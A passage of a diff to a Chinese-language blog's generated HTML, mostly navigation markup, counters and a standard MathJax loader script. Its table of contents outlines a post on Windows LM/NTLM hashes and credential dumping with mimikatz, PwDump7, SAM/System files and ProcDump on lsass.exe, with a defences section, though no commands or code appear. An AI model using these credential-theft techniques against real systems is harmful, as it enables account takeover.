class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#NTLM-Hash%E7%94%9F%E6%88%90%E5%8E%9F%E7%90%86"><span class="nav-number">1.2.1.</span> <span class="nav-text">NTLM Hash生成原理</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96"><span class="nav-number">2.</span> <span class="nav-text">密码抓取</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#GetPassword"><span class="nav-number">2.1.</span> <span class="nav-text">GetPassword</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PwDump7"><span class="nav-number">2.2.</span> <span class="nav-text">PwDump7</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mimikatz"><span class="nav-number">2.3.</span> <span class="nav-text">mimikatz</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E4%BA%A4%E4%BA%92%E5%BC%8F%E6%8A%93%E5%8F%96"><span class="nav-number">2.3.1.</span> <span class="nav-text">本地交互式抓取</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E9%9D%9E%E4%BA%A4%E4%BA%92%E5%BC%8F%E6%8A%93%E5%8F%96"><span class="nav-number">2.3.2.</span> <span class="nav-text">本地非交互式抓取</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#powershell-%E5%8A%A0%E8%BD%BD-mimikatz%E6%8A%93%E5%8F%96"><span class="nav-number">2.4.</span> <span class="nav-text">powershell 加载 mimikatz抓取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87SAM-%E5%92%8C-System-%E6%96%87%E4%BB%B6%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81"><span class="nav-number">2.5.</span> <span class="nav-text">通过SAM 和 System 文件抓取密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Powershell%E8%BF%9B%E8%A1%8CDump-Hashs"><span class="nav-number">2.6.</span> <span class="nav-text">使用Powershell进行Dump Hashs</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ProcDump-mimikatz"><span class="nav-number">2.7.</span> <span class="nav-text">ProcDump + mimikatz</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#dump-lsass-exe-%E8%BF%9B%E7%A8%8B"><span class="nav-number">2.7.1.</span> <span class="nav-text">dump lsass.exe 进程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96dump%E6%96%87%E4%BB%B6"><span class="nav-number">2.7.2.</span> <span class="nav-text">读取dump文件</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%83%A8%E5%88%86%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%8A%93%E5%8F%96%E5%B0%9D%E8%AF%95"><span class="nav-number">2.8.</span> <span class="nav-text">部分系统的抓取尝试</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Windows-Server-2008-R2"><span class="nav-number">2.8.1.</span> <span class="nav-text">Windows Server 2008 R2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Windows7-x64"><span class="nav-number">2.8.2.</span> <span class="nav-text">Windows7 x64</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="nav-number">3.</span> <span class="nav-text">防范措施</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#windows-hash"><span class="nav-number">1.</span> <span class="nav-text">Windows Hash</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#lm-hash"><span class="nav-number">1.1.</span> <span class="nav-text">LM Hash</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#lm-hash-%E7%94%9F%E6%88%90%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.1.</span> <span class="nav-text">LM Hash 生成原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#lm-hash-%E7%BC%BA%E7%82%B9"><span class="nav-number">1.1.2.</span> <span class="nav-text">LM Hash 缺点</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ntlm-hash"><span class="nav-number">1.2.</span> <span class="nav-text">NTLM Hash</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ntlm-hash%E7%94%9F%E6%88%90%E5%8E%9F%E7%90%86"><span class="nav-number">1.2.1.</span> <span class="nav-text">NTLM Hash生成原理</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96"><span class="nav-number">2.</span> <span class="nav-text">密码抓取</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#getpassword"><span class="nav-number">2.1.</span> <span class="nav-text">GetPassword</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pwdump7"><span class="nav-number">2.2.</span> <span class="nav-text">PwDump7</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mimikatz"><span class="nav-number">2.3.</span> <span class="nav-text">mimikatz</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E4%BA%A4%E4%BA%92%E5%BC%8F%E6%8A%93%E5%8F%96"><span class="nav-number">2.3.1.</span> <span class="nav-text">本地交互式抓取</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E9%9D%9E%E4%BA%A4%E4%BA%92%E5%BC%8F%E6%8A%93%E5%8F%96"><span class="nav-number">2.3.2.</span> <span class="nav-text">本地非交互式抓取</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#powershell-%E5%8A%A0%E8%BD%BD-mimikatz%E6%8A%93%E5%8F%96"><span class="nav-number">2.4.</span> <span class="nav-text">powershell 加载 mimikatz抓取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87sam-%E5%92%8C-system-%E6%96%87%E4%BB%B6%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81"><span class="nav-number">2.5.</span> <span class="nav-text">通过SAM 和 System
+文件抓取密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8powershell%E8%BF%9B%E8%A1%8Cdump-hashs"><span class="nav-number">2.6.</span> <span class="nav-text">使用Powershell进行Dump Hashs</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#procdump-mimikatz"><span class="nav-number">2.7.</span> <span class="nav-text">ProcDump + mimikatz</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#dump-lsass.exe-%E8%BF%9B%E7%A8%8B"><span class="nav-number">2.7.1.</span> <span class="nav-text">dump lsass.exe 进程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96dump%E6%96%87%E4%BB%B6"><span class="nav-number">2.7.2.</span> <span class="nav-text">读取dump文件</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%83%A8%E5%88%86%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%8A%93%E5%8F%96%E5%B0%9D%E8%AF%95"><span class="nav-number">2.8.</span> <span class="nav-text">部分系统的抓取尝试</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#windows-server-2008-r2"><span class="nav-number">2.8.1.</span> <span class="nav-text">Windows Server 2008 R2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#windows7-x64"><span class="nav-number">2.8.2.</span> <span class="nav-text">Windows7 x64</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="nav-number">3.</span> <span class="nav-text">防范措施</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -598,7 +645,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -646,7 +693,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -660,7 +707,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -671,7 +718,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -811,6 +858,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
